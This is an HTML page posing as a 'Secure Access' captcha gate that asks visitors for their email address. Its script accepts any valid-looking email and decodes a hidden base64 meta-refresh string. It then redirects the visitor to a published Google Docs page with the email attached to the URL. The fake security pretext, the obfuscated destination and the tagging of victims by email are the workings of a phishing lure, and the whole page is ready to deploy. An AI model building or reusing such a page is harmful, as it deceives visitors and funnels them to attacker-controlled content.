<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    :root {
      --bg: #ffffff;
      --text: #333;
      --box-bg: #f7f7f7;
      --primary: #007bff;
      --success-green: #28a745;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
      position: relative;
    }

    .logo {
      position: absolute;
      top: 10px;
      left: 10px;
      display: flex;
      align-items: center;
      background: var(--box-bg);
      padding: 5px 10px;
      border-radius: 16px;
      box-shadow: 0 0 0 3px var(--primary);
      border: 1px solid var(--primary);
    }

    .logo img {
      width: 18px;
      height: 18px;
      margin-right: 6px;
      object-fit: contain;
    }

    .logo span {
      font-size: 1.05rem;
      font-weight: 600;
      color: var(--primary);
      white-space: nowrap;
    }

    #captcha-box {
      background: var(--box-bg);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.4);
      text-align: center;
      width: 100%;
      max-width: 400px;
      border: 1px solid rgba(0, 123, 255, 0.5);
    }

    .captcha-header {
      font-size: 1.1rem;
      font-weight: 500;
      margin-bottom: 18px;
      color: var(--text);
    }

    #captcha-question {
      font-size: 1.2rem;
      margin-bottom: 12px;
    }

    input[type="email"] {
      font-size: 1rem;
      padding: 10px;
      width: 60%;
      max-width: 200px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      text-align: center;
    }

    button {
      padding: 12px 24px;
      font-size: 1rem;
      background-color: var(--primary);
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #0056b3;
    }

    #message {
      margin-top: 15px;
      font-size: 1.1rem;
      min-height: 24px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }

    .icon-success {
      width: 24px;
      height: 24px;
    }

    p.note {
      font-size: 0.88rem;
      color: #666;
      margin-top: 20px;
      line-height: 1.4;
    }

    @media (max-width: 480px) {
      .logo img {
        width: 18px;
        height: 18px;
        margin-right: 6px;
      }

      .logo span {
        font-size: 0.95rem;
      }
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
    <span>Secure Access</span>
  </div>

  <div id="captcha-box">
    <div class="captcha-header">For security reasons, please enter your email below to continue.</div>
    <input type="email" id="user-email" placeholder="Enter your email" />
    <br />
    <button onclick="validateEmail()">Submit</button>
    <div id="message"></div>
    <p class="note">
      By entering your email correctly, we ensure a direct and secure connection to the document, reducing the risk of unauthorized access.
    </p>
  </div>

  <script>
    let emailValid = false;

    function validateEmail() {
      const userEmail = document.getElementById("user-email").value;
      const msg = document.getElementById("message");

      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

      if (emailPattern.test(userEmail)) {
        emailValid = true;
        msg.innerHTML = `Email is valid <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
        setTimeout(() => {
          redirectUser(userEmail);
        }, 1500);
      } else {
        msg.innerText = "Invalid email. Please enter a valid email address.";
      }
    }

    function redirectUser(email) {
      const base64Ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vZG9jcy5nb29nbGUuY29tL2RvY3VtZW50L2QvZS8yUEFDWC0xdlNVV1loZ3NIUTR6NmpFbGxNVGNYVnZiaTdDVjBoX1F5S0k2MTZoQjRNM1lkRG5KMmxGRk95R0RpZy1wX041THB4TmhPQURNZFVvVlotVi9wdWIlMjIlMjAvJTNF";
      const decodedUrl = decodeMetaRefresh(base64Ref);
      if (!decodedUrl) {
        alert("Redirect failed. Invalid format.");
        return;
      }

      const encodedEmail = encodeURIComponent(email).replace(/%40/g, "@");
      const urlWithParam = `${decodedUrl}?e=${encodedEmail}`;
      window.location.href = urlWithParam;
    }

    function decodeMetaRefresh(base64Str) {
      const decoded = atob(base64Str);
      const match = decodeURIComponent(decoded).match(/url=([^"'&]+)/i);
      return match ? match[1] : null;
    }
  </script>

</body>
</html>
